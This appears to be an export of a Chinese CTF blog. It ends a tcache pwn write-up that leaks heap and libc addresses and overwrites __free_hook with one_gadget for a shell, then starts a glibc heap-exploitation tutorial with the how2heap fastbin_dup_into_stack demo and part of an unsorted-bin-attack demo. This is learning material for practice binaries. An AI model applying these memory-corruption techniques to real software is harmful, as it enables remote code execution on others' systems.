<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  puts(*((const char **)&amp;notes + v1));</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）泄露堆地址。</p>
<p>申请两个chunk分别记为chunk0，chunk1。把chunk1的第8个0x8处填写为0x11，防止与top chunk合并。</p>
<p>此时 chunk1 结构如图：</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JGNR9UDE89QPQV8.jpg"
                      alt="img"
                ></p>
<p>此时heap结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8PMV886RQEQ2XPB.jpg"
                      alt="img"
                ></p>
<p>然后将chunk0释放6次，填满tcache，并选择’n’来构成UAF漏洞。</p>
<p>此时heap和bins结构如下。chunk0的fd为自身地址，show(0)即可泄露堆地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VQRTTYAUDKZ7CBK.jpg"
                      alt="img"
                ></p>
<p>（2）泄露libc基址</p>
<p>再次释放chunk0，并将其fd清空。因为tcache已满7个，所以此时chunk0会进入fast bin。</p>
<p>tcache指向fd位置，而fast bin则指向prev_size，所以chunk0在fast bin中比tcache多0x10。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_P2K9PJJ3XY23DRF.jpg"
                      alt="img"
                ></p>
<p>现在申请一个堆块将会从tcache中获取，将其fd改为(chunk0_fd-0x20)，那么fast bin 将会把(chunk0_fd-0x20)链接进来。</p>
<p>因为将chunk0从tcache中取走，tcache为空，但实际只取走一个堆块，所以counts[0x50]计数为6。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4UUX9X9XCFV3P3S.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，由于tcache为空，那么会去fastbin中寻找，</p>
<p>因为成功从fastbin中返回了堆块，会触发tcache存放机制，将fastbin剩余堆块加入tcache，</p>
<p>又因为fast bin指向prev_size，tcache指向fd，所以将fastbin中堆块加入tcache时，地址会加0x10。</p>
<p>取出的堆块在notes[1]，其用户地址在chunk0_fd(正常)，而tcache中的chunk则指向了chunk0_prev_size位置。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AP5DUCCCSS6XNBH.jpg"
                      alt="img"
                ></p>
<p>此时，free掉notes[1]，将chunk0放进fast bin中，</p>
<p>然后再次申请一个堆块，此堆块由notes[1]管理，将chunk0的size修改为0x91，方便之后的unsorted bin attack。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X83SEQ6GBB7AAN8.jpg"
                      alt="img"
                ></p>
<p>此时，notes[0]的fake_chunk0大小已被修改为0x91，释放8次notes[0]即可将fake_chunk0放进unsorted bin。</p>
<p>然后其fd和bk指针将被修改为一个栈上的地址(main_arena+88)</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_9YWKZ4DXCQ5QRBT.jpg"
                      alt="img"
                ></p>
<p>计算其与libc基地址的偏移。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SH8FTTPY2M66RRC.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HXUYZWCQP9QHCS3.jpg"
                      alt="img"
                ></p>
<p>因为输出用到puts函数，而这个栈地址在fake_chunk0_fd位置，</p>
<p>所以需要利用notes[1]将fake_chunk0的的prev_size和size填满泄露libc地址时才能避免截断。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QMVR2WYC2N9A88H.jpg"
                      alt="img"
                ></p>
<p>将泄露出来的栈地址减去计算出来的偏移，即可得到libc基址。</p>
<p>（3）将__free_hook替换为one_gadget。</p>
<p>利用one_gadget工具获取one_gadget。</p>
<p>因为已经得到了libc基址，那么可以根据给的libc-2.26.so得到__free_hook和one_gadget的运行时真实地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_MN5N9AXJB8D5WK9.jpg"
                      alt="img"
                ></p>
<p>利用notes[1]可以将fake_chunk0_fd改为__free_hook-0x10的地址。</p>
<p>此时fastbin将__free_hook链接进来了。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ANN46ZTE7FJ6HPR.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，会由notes[0]来管理。并且会触发tcache相关机制，将fastbin中剩余chunk（__free_hook）加入tcache。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6THJNUWWQWE2UDG.jpg"
                      alt="img"
                ></p>
<p>此时因为管理已满两个，需要将notes[0]释放并清0。由于tcache已满，其会进入fastbin。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J5ETUWKBVKPC2GE.jpg"
                      alt="img"
                ></p>
<p>此时在申请的堆块会由notes[0]管理，再次申请一个堆块则会从tcache中获取__free_hook的地址，将其修改为one_gadget。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SHPQPCWP6VZ5YXR.jpg"
                      alt="img"
                ></p>
<p>此时随便del一个notes[i]就会触发one_gadget，从而getshell；<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_35RYCASC2VV4JFH.jpg"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_heap及赛题详细解析</title>
    <url>/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>ptmalloc2</code> 的管理方式，<code>chunk</code> 结构和 <code>bins</code> 的模型，在<a class="link"   href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/" >Overview of GLIBC heap exploitation techniques <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/" >ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以及<a class="link"   href="https://blog.csdn.net/Tokameine/article/details/119490052" >一些博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 <code>glibc-2.23，2.27，2.31，2.35，2.37</code> 主流版本和相关例题，<code>glibc-2.23</code> 后面更新一些变化和新的利用方式，这里不包含 <code>IO_FILE</code> 的内容，<code>IO_FILE</code> 会单独做一个专题。建议看完 <code>glibc</code> 源码分析后再来看，当然直接看也无所谓。目前比赛的 <code>glibc</code> 版本基本都是这几个长期支持版本，期间版本就不写了，另外文中没有标记 <code>glibc</code> 版本的就是到目前位置依然适用的方法。我将我的部分文章做了一个合集，入门新手先凑合着看吧。再看从前写的文章，很是稚嫩，不太易读易懂。</p>
<ul>
<li>主要配置</li>
</ul>
<p><a class="link"   href="https://github.com/RoderickChan/pwncli" >pwncli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/scwuaptx/Pwngdb" >PwnGdb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://bbs.kanxue.com/thread-276203.htm" >gdb配置参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>我的主要操作环境</li>
</ul>
<p><code>wsl-kali</code>。配置参考我的<a class="link"   href="https://bbs.kanxue.com/thread-278044.htm" >另一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><code>docker desktop</code>镜像</p>
<p><code>ubuntu:16.04</code></p>
<p><code>ubuntu:18.04</code></p>
<p><code>ubuntu:20.04</code></p>
<p><code>ubuntu:22.04</code></p>
<p><code>ubuntu:23.04</code></p>
<p>编译时可以加<code>-g</code>来方便调试。</p>
<p><code>ida pro 7.7 + gdb</code>调试。</p>
<ul>
<li>我的<code>.gdbinit</code>文件</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">source ~/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment">#set context-clear-screen on</span></span><br><span class="line"><span class="comment">#set debug-events off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /root/splitmind/gdbinit.py</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections = &quot;regs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mode = input(&quot;source/disasm/mixed mode:?(s/d/m)&quot;) or &quot;d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import splitmind</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter = splitmind.Mind()</span></span><br><span class="line"><span class="comment">#spliter.select(&quot;main&quot;).right(display=&quot;regs&quot;, size=&quot;50%&quot;)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-stack-lines 10&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#legend_on = &quot;code&quot;</span></span><br><span class="line"><span class="comment">#if mode == &quot;d&quot;:</span></span><br><span class="line"><span class="comment">#    legend_on = &quot;disasm&quot;</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;disasm&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elif mode == &quot;s&quot;:</span></span><br><span class="line"><span class="comment">#    sections += &quot; code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;)</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;code&quot;).below(display=&quot;disasm&quot;, size=&quot;40%&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 8&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 20&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections += &quot; args stack backtrace expressions&quot;</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;legend&quot;, on=legend_on)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;stack&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;backtrace&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;args&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;expressions&quot;, on=&quot;args&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-sections \&quot;%s\&quot;&quot; % sections)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set show-retaddr-reg on&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter.build()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure></div>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><ul>
<li>house_of_spirit<br><a class="link"   href="https://www.52pojie.cn/thread-1819636-1-1.html" >LCTF 2016 : PWN200 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="built_in">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用<code>ubuntu:16.04</code>进行编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png"
                     
                ><br>使用<code>pwncli</code>改写<code>rpath</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRQV6TQJYQWAXFV.png"
                     
                ><br>在malloc三次后， 0x400743处下断点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U8FQ8QMKCMJEEHE.png"
                     
                ><br>查看堆信息,三个fastbin的堆块，f1,f2,f3。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YBSW3KZB8CFB9PV.png"
                     
                ><br>在free(f1),free(f2),free(f1)后，在0x40083B下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XRP63QAXTP42DB4.png"
                     
                ><br>查看fastbinY信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5PQAMT3K7NY6GSP.png"
                     
                ><br>0x20大小的fastbins链上形成了double free。<br>再次malloc两次后，设断点在0x40089F<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B4MCXD5ETFVSG4E.png"
                     
                ><br>再次查看bins，因为申请两次后，fastbins中剩下f1(0x60300)，而0x60300指向0x603020没有改变，0x603020指向0x60300也没变，并且fastbins中的chunk标记为prev_inuse一直为1，所以fastbins中依然保留这个ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7QJAPUB4DDD2PHB.png"
                     
                ><br>接下来，查看汇编代码，StackVar值改为0x20，为了放入0x20大小的fastbins,接下来把f1指向了StackVar以上0x8处，也就是prev_size的位置。将StackVar放入了0x20的fastbins中。在0x40092C处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PUYYFZPQXKV9KS.png"
                     
                ><br>查看堆信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_TMDXE86NU7SRWS3.png"
                     
                ><br>这时候在申请两次便可申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_WBDHQYTZ4AXN4ZB.png"
                     
                ><br>在0x40095c下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D7WDB4DZ4DJS79F.png"
                     
                ><br>可以看到，已经申请到了栈上的值。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	